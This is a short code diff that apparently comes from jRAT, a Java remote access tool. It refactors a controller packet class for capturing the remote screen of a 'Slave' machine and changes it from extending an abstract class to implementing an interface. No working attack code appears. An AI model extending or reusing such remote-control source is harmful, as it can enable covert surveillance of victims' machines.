@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet12RemoteScreen extends AbstractOutgoingPacket {
+public class Packet12RemoteScreen implements OutgoingPacket {
 
 	private int size;
 	private int quality;
